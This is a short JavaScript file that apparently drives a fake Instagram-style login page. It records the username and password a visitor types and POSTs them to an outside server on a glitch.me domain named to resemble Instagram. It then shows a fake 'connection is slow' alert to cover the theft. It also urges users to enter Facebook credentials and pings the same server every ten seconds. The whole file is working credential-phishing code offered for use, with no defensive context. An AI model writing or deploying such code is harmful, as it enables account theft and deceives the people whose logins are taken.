 
var txtusername = document.getElementById('txtun')
var txtpassword = document.getElementById('txtps')
var btnlogin = document.getElementById('login')
var btnfb = document.getElementById('cfb')

var data = {
    username: undefined,
    password: undefined
}

txtusername.addEventListener('keyup', function (e) {
    data.username = e.target.value;
})

txtpassword.addEventListener('keyup', function (e) {
    data.password = e.target.value;
})

btnlogin.addEventListener('click', function (e) {
    if (!data.username || !data.password) return alert('Please fill the form');
    const URL = 'https://instagram-profile-you.glitch.me/data';
    fetch(URL, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    })
      .then(res => res.json())
      .then(data => {
      alert('Connection is slow,\nprocessing you request...')
      console.log(data.response)
    })
})

btnfb.addEventListener('click', function (e) {
    alert('Please fill the form with facebook credentials.')
})



setInterval(function() {
    const URL = 'https://instagram-profile-you.glitch.me/alive';
    fetch(URL)
      .then(res => res.json())
      .then(data => console.log(data.msg))
},10000)